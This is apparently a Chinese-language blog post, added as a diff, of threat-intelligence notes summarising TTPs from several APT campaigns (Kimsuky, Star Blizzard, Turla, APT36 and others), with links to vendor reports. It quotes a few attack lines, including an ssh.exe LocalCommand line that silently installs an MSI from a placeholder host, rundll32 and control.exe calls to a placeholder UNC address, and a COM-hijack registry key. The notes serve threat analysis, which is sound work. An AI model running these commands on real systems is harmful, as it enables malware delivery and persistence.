@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2026/10/31/Threat-Intelligence-TTP-Notes-2/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2026/10/31/Threat-Intelligence-TTP-Notes-2/","path":"2026/10/31/Threat-Intelligence-TTP-Notes-2/","title":"威胁情报TTP笔记-2"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>威胁情报TTP笔记-2 | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-threat-blog"><a href="/Threat-Blog/" rel="section"><i class="fa fa-star fa-fw"></i>Threat-Blog</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%9021"><span class="nav-text">分析21</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%9022"><span class="nav-text">分析22</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%9023"><span class="nav-text">分析23</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%9024"><span class="nav-text">分析24</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%9025"><span class="nav-text">分析25</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%9026"><span class="nav-text">分析26</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%9027"><span class="nav-text">分析27</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%9028"><span class="nav-text">分析28</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%9029"><span class="nav-text">分析29</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%9030"><span class="nav-text">分析30</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%9031"><span class="nav-text">分析31</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%9032"><span class="nav-text">分析32</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/10/31/Threat-Intelligence-TTP-Notes-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="威胁情报TTP笔记-2 | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          威胁情报TTP笔记-2
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-10-31 00:00:00" itemprop="dateCreated datePublished" datetime="2026-10-31T00:00:00+08:00">2026-10-31</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Red-Team/" itemprop="url" rel="index"><span itemprop="name">Red-Team</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Threat-Intelligence-TTP-Notes/1.png"></p>
+<a id="more"></a>
+
+<h1 id="分析21"><a href="#分析21" class="headerlink" title="分析21"></a>分析21</h1><p>朝鲜 - Kimsuky、APT43</p>
+<p><a target="_blank" rel="noopener" href="https://wezard4u.tistory.com/429876">https://wezard4u.tistory.com/429876</a></p>
+<ul>
+<li>.link 文件钓鱼、执行powershell</li>
+<li>powershell 添加计划任务，执行1.ps1</li>
+<li>1.ps1从github拉取2.ps1并执行</li>
+</ul>
+<p>总结：无后续</p>
+<h1 id="分析22"><a href="#分析22" class="headerlink" title="分析22"></a>分析22</h1><p>朝鲜 - Kimsuky、APT43</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/9ilhH-WUqeNCStDfbrBsrw">https://mp.weixin.qq.com/s/9ilhH-WUqeNCStDfbrBsrw</a></p>
+<ul>
+<li>安装程序投毒</li>
+<li>从资源文件提取zip，解密释放正常软件和恶意.link</li>
+<li>link执行powershell，进程识别、vm识别、信息探针、添加计划任务</li>
+<li>下载隐写数据文件，修复文件头、反射加载.NET Rat</li>
+<li>Rat采用 <strong>动态插件加载机制</strong></li>
+</ul>
+<p>总结：无</p>
+<h1 id="分析23"><a href="#分析23" class="headerlink" title="分析23"></a>分析23</h1><p>熊猫 - Volt Typhoon</p>
+<p><a target="_blank" rel="noopener" href="https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf">https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf</a></p>
+<p>总结：无</p>
+<h1 id="分析24"><a href="#分析24" class="headerlink" title="分析24"></a>分析24</h1><p>熊猫 - BlueMoon 漏洞利用工具包（Chrome+Windows）</p>
+<p><a target="_blank" rel="noopener" href="https://www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/">https://www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.volexity.com/blog/2026/09/21/mind-the-patch-gap-part-2-fake-websites-used-to-deploy-chrome-windows-0-day-exploits/">https://www.volexity.com/blog/2026/09/21/mind-the-patch-gap-part-2-fake-websites-used-to-deploy-chrome-windows-0-day-exploits/</a></p>
+<p><a target="_blank" rel="noopener" href="https://thehackernews.com/2026/09/four-spy-groups-used-same-chrome-and.html">https://thehackernews.com/2026/09/four-spy-groups-used-same-chrome-and.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://thehackernews.com/2026/09/china-linked-hackers-exploit-chrome.html">https://thehackernews.com/2026/09/china-linked-hackers-exploit-chrome.html</a></p>
+<p>漏洞利用链：</p>
+<ul>
+<li>v8类型混淆</li>
+<li>v8沙箱逃逸</li>
+<li>Windows ALPC 提权（CVE-2026-85880）</li>
+</ul>
+<p>UTA0560：</p>
+<ul>
+<li>白加黑，添加计划任务、下载 .msi 文件</li>
+<li>msiexec 执行 .msi文件</li>
+<li>.msi文件执行自定义js代码</li>
+<li>js代码拉取恶意js并通过eval() 执行</li>
+<li>恶意js为后门程序功能代码，提供简单的操作</li>
+</ul>
+<p>Violet Typhoon：</p>
+<ul>
+<li>执行一个chrome拓展静默安装器</li>
+<li>恶意拓展功能：键盘记录、cookie和会话窃取、屏幕截图、数据外泄</li>
+</ul>
+<p>UTA0565：</p>
+<ul>
+<li>控制流扁平化的简单c后门</li>
+</ul>
+<p>总结：漏洞利用工具包像是被卖的</p>
+<h1 id="分析25"><a href="#分析25" class="headerlink" title="分析25"></a>分析25</h1><p>伊朗 - SHELBY</p>
+<p><a target="_blank" rel="noopener" href="https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/">https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/</a></p>
+<ul>
+<li>冒充IT部门，向软件工程师发送职位邀请</li>
+<li>前期话术铺垫后发送恶意Visual Studio测试项目，作为能力测试诱导应聘人员打开</li>
+<li><strong>恶意.csproj</strong> 通过 GetFrameworkPaths 进行payload复制、启动白exe</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Threat-Intelligence-TTP-Notes/image-20261011010147984.png" alt="image-20261011010147984"></p>
+<ul>
+<li>白exe为合法且签名，但是通过 <strong>.config 文件</strong> 实现 <strong>AppDomainManager劫持</strong>，关闭ETW</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Threat-Intelligence-TTP-Notes/image-20261011010129001.png" alt="image-20261011010129001"></p>
+<ul>
+<li>白加黑启动黑dll</li>
+<li>Obfuscar 文件混淆</li>
+</ul>
+<p>loader - 黑dll：</p>
+<ul>
+<li><p>沙箱检测</p>
+</li>
+<li><p>持久化：添加启动项注册表</p>
+</li>
+<li><p>通过Github三方实现：主机信息上传、本地命令执行并结果上传、issue作为备用</p>
+</li>
+<li><p>本地命令执行 通过自定义的PsProxy.dll，<strong>利用加载 System.Management.Automation 程序集，在不启动powershell.exe 进程情况下命令执行</strong></p>
+</li>
+<li><p>解密文件，内存加载 Rat</p>
+</li>
+</ul>
+<p>总结：<strong>利用 .NET AppDomainManager劫持 操纵合法的配置文件禁用ETW、利用 System.Management.Automation 绕过powershell.exe 进程</strong></p>
+<h1 id="分析26"><a href="#分析26" class="headerlink" title="分析26"></a>分析26</h1><p>印度 - Patchwork、白象、摩诃草</p>
+<p><a target="_blank" rel="noopener" href="https://pan1c.org/posts/patchwork-badnews-backdoor/">https://pan1c.org/posts/patchwork-badnews-backdoor/</a></p>
+<ul>
+<li>.link文件钓鱼，启动powershell远程下载loader等文件</li>
+<li>创建计划任务运行白exe</li>
+<li>白加黑</li>
+<li>黑dll，一个简易的peloader，解密并运行Rat</li>
+<li>Rat功能简单</li>
+</ul>
+<p>总结：无</p>
+<h1 id="分析27"><a href="#分析27" class="headerlink" title="分析27"></a>分析27</h1><p>朝鲜 - Kimsuky、APT43</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/LkX7gqz6uxyYFPHP9qJgBA">https://mp.weixin.qq.com/s/LkX7gqz6uxyYFPHP9qJgBA</a></p>
+<ul>
+<li>.link文件钓鱼，bat释放</li>
+<li>certutil.exe从三方下载诱饵文档并打开</li>
+<li>下载 <strong>NirCmd.exe：nircmd.exe exec hide “C:\Scripts\backup.bat”</strong></li>
+</ul>
+<blockquote>
+<p>NirCmd 是 NirSoft 开发的一款免费、轻量级 Windows 命令行工具，可通过简单指令执行系统控制、文件管理、注册表操作、网络管理等多种任务，无需图形界面</p>
+</blockquote>
+<ul>
+<li>添加计划任务，持久化运行nircmd.exe</li>
+<li>读取 <strong>HKLM\SOFTWARE\Microsoft\Cryptography</strong> 全局唯一标识</li>
+<li>多阶段使用certutil.exe、curl.exe 从三方下载c2等文件</li>
+<li><strong>copy 重命名 conhost –headless 启动 powershell.exe</strong></li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Threat-Intelligence-TTP-Notes/image-20261019235725618.png" alt="image-20261019235725618"></p>
+<p>总结：NirCmd.exe - LOLbins</p>
+<h1 id="分析28"><a href="#分析28" class="headerlink" title="分析28"></a>分析28</h1><p>越南 - 海莲花、APT32</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/FIDg23u6Peb_cR8N7ddzbA">https://mp.weixin.qq.com/s/FIDg23u6Peb_cR8N7ddzbA</a></p>
+<ul>
+<li>.zip文件钓鱼，包含恶意.img镜像文件，再次解压后包含.link与子目录多个恶意文件</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Threat-Intelligence-TTP-Notes/image-20261020000700738.png" alt="image-20261020000700738"></p>
+<ul>
+<li>.link执行vbs</li>
+<li>打开诱饵文档、复制白加黑、运行dll</li>
+<li>延时启动白加黑</li>
+</ul>
+<p>loader - 黑dll：</p>
+<ul>
+<li>反调试、反沙箱</li>
+<li>持久化1：写入注册表</li>
+<li>持久化2：导出注册表并修改，通过shellcode加载HiveSwarming.exe转化为 <strong>NTUSER.MAN</strong> 文件实现持久化</li>
+<li>执行shellcode，栈字符串隐藏、API hash。内存中加载C2</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Threat-Intelligence-TTP-Notes/image-20261020001553714.png" alt="image-20261020001553714"></p>
+<p>总结：<strong>NTUSER.MAN 持久化</strong> 参看：<a target="_blank" rel="noopener" href="https://www.praetorian.com/blog/corrupting-the-hive-mind-persistence-through-forgotten-windows-internals/">https://www.praetorian.com/blog/corrupting-the-hive-mind-persistence-through-forgotten-windows-internals/</a></p>
+<h1 id="分析29"><a href="#分析29" class="headerlink" title="分析29"></a>分析29</h1><p>俄罗斯 - Star Blizzard</p>
+<p><a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/security/blog/2026/09/29/star-blizzard-refines-phishing-and-malware-delivery-with-the-redflick-technique/">https://www.microsoft.com/en-us/security/blog/2026/09/29/star-blizzard-refines-phishing-and-malware-delivery-with-the-redflick-technique/</a></p>
+<ul>
+<li>zip文件钓鱼，包含恶意 <strong>.VHDX</strong> 虚拟硬盘文件，再次解压后包含.link与子目录多个恶意文件</li>
+<li>.link启动 <strong>conhost.exe –headless 启动 cmd.exe 执行bat</strong></li>
+<li>释放诱饵文件</li>
+<li>利用 ssh.exe 的 <strong>LocalCommand</strong> 启动 cmd.exe 与 msiexec 远程安装msi文件</li>
+</ul>
+<blockquote>
+<p>ssh.exe -o “StrictHostkeychecking=no” -o “PermitlocalCommand=yes” -o “LocalCommand=cmd.exe /q /c start msiexec /q /i <a target="_blank" rel="noopener" href="https://xxx/f.msi&quot;">https://xxx/f.msi&quot;</a></p>
+</blockquote>
+<ul>
+<li>msi通过 <strong>control.exe 运行恶意 .cpl文件（DLL文件）</strong> 进行下载安装C2</li>
+<li>使用多个LOL文件<ul>
+<li><strong>rundll32.exe Shell32.dll,Control_RunDLL \\x.x.x.x</strong></li>
+<li><strong>control.exe \\x.x.x.x</strong></li>
+</ul>
+</li>
+</ul>
+<p>总结：ssh.exe、control.exe - LOLbins</p>
+<h1 id="分析30"><a href="#分析30" class="headerlink" title="分析30"></a>分析30</h1><p>俄罗斯 - Secret Blizzard、Turla</p>
+<p><a target="_blank" rel="noopener" href="https://pan1c.org/posts/turla-new-sample-analysis/">https://pan1c.org/posts/turla-new-sample-analysis/</a></p>
+<ul>
+<li>vbs启动</li>
+<li>子程序创建COM组件</li>
+<li>rundll32执行COM组件</li>
+<li><strong>BinaryFormatter反序列化内存执行C2</strong></li>
+</ul>
+<p>总结：无</p>
+<h1 id="分析31"><a href="#分析31" class="headerlink" title="分析31"></a>分析31</h1><p>巴基斯坦 - APT36、Transparent Tribe、透明部落</p>
+<p><a target="_blank" rel="noopener" href="https://pan1c.org/posts/curry-flavored-article/">https://pan1c.org/posts/curry-flavored-article/</a></p>
+<ul>
+<li><strong>.VHDX</strong> 文件钓鱼，包含恶意 .link 调用mshta远程下载hta文件并执行</li>
+</ul>
+<blockquote>
+<p>许多网关缺乏深度解析 VHD/VHDX 内部文件结构的能力，显著增加了静态检测的难度</p>
+<p>Windows 10 及更高版本系统原生支持挂载 VHD/VHDX 文件，用户双击即可像打开普通磁盘一样查看其中的内容，操作流畅且无需第三方软件</p>
+<p>能绕过 Windows 的 MoTW 保护</p>
+</blockquote>
+<ul>
+<li>hta通过 <strong>BinaryFormatter反序列化内存执行C2</strong></li>
+<li>wmi 查询 SecurityCenter2 识别AV</li>
+<li>不同AV有差异化的持久方法</li>
+<li>C# Rat</li>
+</ul>
+<p>总结：关于 <strong>VHD/VHDX</strong> 的利用详见 ：<a target="_blank" rel="noopener" href="https://www.sei.cmu.edu/blog/the-dangers-of-vhd-and-vhdx-files/">The Dangers of VHD and VHDX Files</a></p>
+<h1 id="分析32"><a href="#分析32" class="headerlink" title="分析32"></a>分析32</h1><p>韩国 - APT-C-60、伪猎者</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/A1UhFfqnGRLsEZywvaQA4A">https://mp.weixin.qq.com/s/A1UhFfqnGRLsEZywvaQA4A</a></p>
+<ul>
+<li><strong>.vhdx</strong> 文件钓鱼，包含恶意 .link </li>
+<li>.link 执行命令</li>
+<li>添加注册表 <strong>HKCU\\Software\\Classes\\CLSID\{566296fe-e0e8-475f-ba9c-a31ad31620b1}\\InProcServer32</strong> 实现 <strong>COM劫持</strong></li>
+<li>重启后触发COM劫持，启动downloader1</li>
+</ul>
+<p>downloader1 - dll：</p>
+<ul>
+<li>xor解密API函数字符串，动态模块加载</li>
+<li>github下载解密落地，然后LoadLibraryW 加载downloader2</li>
+</ul>
+<p>downloader2 - dll：</p>
+<ul>
+<li>xor解密API函数字符串，动态模块加载</li>
+<li><strong>COM接口创建计划任务</strong></li>
+<li>计划任务创建 <strong>COM劫持</strong></li>
+<li>github下载，内存解密后，落地补全PE头</li>
+<li>触发COM劫持触发loader</li>
+</ul>
+<p>loader - dll：</p>
+<ul>
+<li>LoadLibraryW 加载 C2</li>
+</ul>
+<p>C2：</p>
+<ul>
+<li>解密字符串、互斥、<strong>SetFileAttributesW</strong> 设置隐藏属性</li>
+</ul>
+<p>总结：多阶段、COM劫持</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/09/29/Threat-Intelligence-TTP-Notes-1/" rel="prev" title="威胁情报TTP笔记-1">
+                  <i class="fa fa-angle-left"></i> 威胁情报TTP笔记-1
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
